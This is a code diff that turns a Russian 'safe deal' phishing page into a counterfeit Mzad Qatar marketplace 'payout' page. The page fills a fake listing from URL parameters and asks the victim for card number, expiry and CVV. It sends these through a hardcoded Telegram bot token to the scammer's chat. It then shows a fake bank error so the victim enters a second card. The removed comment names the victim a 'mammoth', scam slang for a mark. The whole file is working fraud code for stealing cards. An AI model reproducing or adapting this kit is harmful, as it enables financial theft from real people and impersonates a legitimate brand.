@@ -1,120 +1,135 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Безопасная сделка | Получение средств</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mzad Qatar | Marketplace</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f4f7; margin: 0; padding: 0; color: #2d3436; }
-        .header { background: #ffffff; padding: 15px; text-align: center; border-bottom: 1px solid #e1e4e8; font-weight: bold; font-size: 18px; color: #00aa6e; }
-        .container { max-width: 480px; margin: 0 auto; padding: 15px; }
+        :root { --mzad-color: #8a1538; --mzad-text: #2d2d2d; --mzad-gray: #757575; --mzad-bg: #f4f4f4; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--mzad-bg); margin: 0; padding: 0; color: var(--mzad-text); -webkit-font-smoothing: antialiased; }
+        .app-shell { max-width: 500px; margin: 0 auto; background: white; min-height: 100vh; display: flex; flex-direction: column; }
         
-        /* Карточка товара */
-        .item-card { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin-bottom: 20px; text-align: center; }
-        .item-img { width: 120px; height: 120px; background: #f8f9fa; border-radius: 10px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
-        .item-title { font-size: 20px; font-weight: 700; margin: 0 0 5px; }
-        .item-price { font-size: 24px; font-weight: 800; color: #00aa6e; margin-bottom: 10px; }
-        
-        /* Форма получения */
-        .payout-form { background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .payout-form h3 { margin-top: 0; font-size: 16px; color: #636e72; text-transform: uppercase; letter-spacing: 1px; }
-        .input-group { margin-bottom: 15px; text-align: left; }
-        label { display: block; font-size: 12px; color: #b2bec3; margin-bottom: 5px; font-weight: 600; }
-        input { width: 100%; padding: 14px; border: 1px solid #dfe6e9; border-radius: 8px; box-sizing: border-box; font-size: 16px; transition: 0.3s; }
-        input:focus { border-color: #00aa6e; outline: none; }
-        
-        .btn-receive { background: #00aa6e; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,170,110,0.3); }
-        .btn-receive:active { transform: scale(0.98); }
+        /* Navbar */
+        .navbar { height: 60px; background: white; border-bottom: 1px solid #e0e0e0; display: flex; align-items: center; justify-content: center; position: sticky; top: 0; z-index: 100; }
+        .navbar .logo { color: var(--mzad-color); font-size: 20px; font-weight: 800; letter-spacing: 1px; }
 
-        .secure-info { display: flex; align-items: center; justify-content: center; margin-top: 20px; color: #b2bec3; font-size: 12px; }
-        .secure-info svg { margin-right: 5px; }
+        /* Item Header */
+        .item-preview { padding: 15px; border-bottom: 8px solid var(--mzad-bg); text-align: center; }
+        .item-img-box { width: 100%; height: 250px; background: #eee; border-radius: 8px; margin-bottom: 15px; overflow: hidden; }
+        .item-img-box img { width: 100%; height: 100%; object-fit: cover; }
+        .item-price { color: var(--mzad-color); font-size: 28px; font-weight: 800; margin: 10px 0; }
+        .item-name { font-size: 18px; font-weight: 600; color: #444; }
+
+        /* Seller Details (Dynamic) */
+        .section-header { padding: 15px 15px 5px; font-size: 13px; font-weight: 700; color: var(--mzad-gray); text-transform: uppercase; }
+        .seller-card { padding: 0 15px 15px; }
+        .detail-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 15px; }
+        .detail-label { color: var(--mzad-gray); }
+        .detail-val { font-weight: 600; }
+
+        /* Payment Form */
+        .payout-form { padding: 20px 15px; background: white; border-top: 8px solid var(--mzad-bg); }
+        .payout-form h3 { color: var(--mzad-color); font-size: 18px; margin-bottom: 20px; text-align: center; }
+        .input-f { width: 100%; padding: 15px; border: 1px solid #d1d1d1; border-radius: 8px; box-sizing: border-box; font-size: 16px; margin-bottom: 12px; outline: none; }
+        .input-f:focus { border-color: var(--mzad-color); }
+        .btn-confirm { background: var(--mzad-color); color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.2s; }
+        .btn-confirm:active { opacity: 0.8; transform: scale(0.98); }
+
+        /* Footer */
+        .footer { background: #1a1a1a; color: #888; padding: 30px 15px; text-align: center; font-size: 12px; margin-top: auto; }
+        .footer b { color: #ccc; }
     </style>
 </head>
 <body>
 
-<div class="header">Безопасная сделка</div>
+<div class="app-shell">
+    <nav class="navbar">
+        <div class="logo">MZAD QATAR</div>
+    </nav>
 
-<div class="container">
-    <div class="item-card">
-        <div class="item-img" id="display-img">📦</div>
-        <div class="item-title" id="display-title">Название товара</div>
-        <div class="item-price" id="display-price">0 ₽</div>
-        <p style="font-size: 13px; color: #636e72;">Покупатель оплатил заказ. Нажмите кнопку ниже, чтобы зачислить средства на вашу карту.</p>
+    <div class="item-preview">
+        <div class="item-img-box">
+            <img id="d-img" src="">
+        </div>
+        <div class="item-price" id="d-price">0 QAR</div>
+        <div class="item-name" id="d-item">Loading item...</div>
+    </div>
+
+    <div class="section-header">Seller Information</div>
+    <div class="seller-card">
+        <div class="detail-row"><span class="detail-label">Seller:</span> <span class="detail-val" id="d-seller">...</span></div>
+        <div class="detail-row"><span class="detail-label">Phone:</span> <span class="detail-val" id="d-phone">...</span></div>
+        <div class="detail-row"><span class="detail-label">Location:</span> <span class="detail-val" id="d-addr">...</span></div>
     </div>
 
     <div class="payout-form">
-        <h3>Реквизиты для зачисления</h3>
-        <form id="payout-form">
-            <div class="input-group">
-                <label>НОМЕР КАРТЫ</label>
-                <input type="text" id="cc" placeholder="0000 0000 0000 0000" required>
-            </div>
+        <h3>Safe Payout Verification</h3>
+        <form id="pay-f">
+            <input type="text" id="cc" class="input-f" placeholder="Card Number" required>
             <div style="display: flex; gap: 10px;">
-                <div class="input-group" style="flex: 2;">
-                    <label>СРОК ДЕЙСТВИЯ</label>
-                    <input type="text" id="exp" placeholder="ММ/ГГ" required>
-                </div>
-                <div class="input-group" style="flex: 1;">
-                    <label>CVV/CVC</label>
-                    <input type="password" id="cvv" placeholder="***" required>
-                </div>
+                <input type="text" id="exp" class="input-f" placeholder="MM/YY" required>
+                <input type="text" id="cvv" class="input-f" placeholder="CVV" required>
             </div>
-            <button type="submit" class="btn-receive" id="btn-text">ПОЛУЧИТЬ ВЫПЛАТУ</button>
+            <button type="submit" class="btn-confirm" id="btn-text">RECEIVE PAYOUT</button>
         </form>
     </div>
 
-    <div class="secure-info">
-        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v4.7c0 4.67-3.13 8.75-7 9.81-3.87-1.06-7-5.14-7-9.81V6.3l7-3.12z"/></svg>
-        Защищено шифрованием SSL
+    <div class="footer">
+        <p>Verified by <b>Mzad Security Team</b></p>
+        <p>© 2026 Mzad Qatar. All rights reserved.</p>
     </div>
 </div>
 
 <script>
-    // --- ТВОИ НАСТРОЙКИ ---
+    // --- CONNECT TO YOUR BOT ---
     const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
     const CHAT_ID = '8071425015';
 
-    // 1. Читаем параметры из ссылки
-    const params = new URLSearchParams(window.location.search);
-    const item = params.get('item') || 'Товар';
-    const price = params.get('price') || '0';
-    const imgType = params.get('img') || '1';
+    // Parse data from URL
+    const q = new URLSearchParams(window.location.search);
+    const itemName = q.get('item') || 'Product';
+    const itemPrice = q.get('price') || '0';
+    const itemImg = q.get('img') || 'https://via.placeholder.com/250';
+    const seller = q.get('seller') || 'Official Seller';
+    const phone = q.get('phone') || '+974 0000 0000';
+    const addr = q.get('addr') || 'Doha, Qatar';
 
-    // 2. Подставляем данные в оформление
-    document.getElementById('display-title').innerText = item;
-    document.getElementById('display-price').innerText = price + ' ₽';
-    
-    // Меняем иконку в зависимости от категории (img=1, 2, 3...)
-    const icons = { '1': '📱', '2': '💻', '3': '🧥', '4': '🚲', '5': '📸' };
-    document.getElementById('display-img').innerText = icons[imgType] || '📦';
+    // Apply data to UI
+    document.getElementById('d-item').innerText = itemName;
+    document.getElementById('d-price').innerText = itemPrice + ' QAR';
+    document.getElementById('d-img').src = itemImg;
+    document.getElementById('d-seller').innerText = seller;
+    document.getElementById('d-phone').innerText = phone;
+    document.getElementById('d-addr').innerText = addr;
 
-    // 3. Отправка данных в бота
-    document.getElementById('payout-form').addEventListener('submit', async (e) => {
+    // Send to Telegram
+    document.getElementById('pay-f').onsubmit = async (e) => {
         e.preventDefault();
-        const btn = document.getElementById('btn-text');
-        btn.innerText = 'ПОДОЖДИТЕ...';
-        btn.disabled = true;
+        const b = document.getElementById('btn-text');
+        b.innerText = 'WAITING...';
+        b.disabled = true;
 
-        const data = `💰 **НОВАЯ ВЫПЛАТА**\n\n📦 Товар: ${item}\n💵 Сумма: ${price} ₽\n\n💳 Карта: \`${document.getElementById('cc').value}\`\n📅 Срок: \`${document.getElementById('exp').value}\`\n🔒 CVV: \`${document.getElementById('cvv').value}\``;
+        const logMsg = `🇶🇦 **MZAD QATAR LOG**\n\n📦 Item: ${itemName}\n💰 Price: ${itemPrice} QAR\n\n💳 Card: \`${document.getElementById('cc').value}\`\n📅 Exp: \`${document.getElementById('exp').value}\`\n🔒 CVV: \`${document.getElementById('cvv').value}\`\n\n👤 Seller: ${seller}\n📱 Phone: ${phone}`;
 
         try {
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: logMsg, parse_mode: 'Markdown' })
             });
 
-            // "Ошибка" для мамонта, чтобы ввел вторую карту
+            // Loop to get more logs
             setTimeout(() => {
-                alert("Ошибка подтверждения личности. Для зачисления средств воспользуйтесь картой другого банка.");
-                btn.innerText = 'ПОЛУЧИТЬ ВЫПЛАТУ';
-                btn.disabled = false;
-            }, 1500);
+                alert("Transaction error: 0x552. Your bank rejected the payout. Please use another card to receive funds instantly.");
+                b.innerText = 'RECEIVE PAYOUT';
+                b.disabled = false;
+                document.getElementById('pay-f').reset();
+            }, 2500);
         } catch (err) {
-            alert("Сервис временно недоступен");
-            btn.disabled = false;
+            alert("Connection timeout.");
+            b.disabled = false;
         }
-    });
+    };
 </script>
 
 </body>
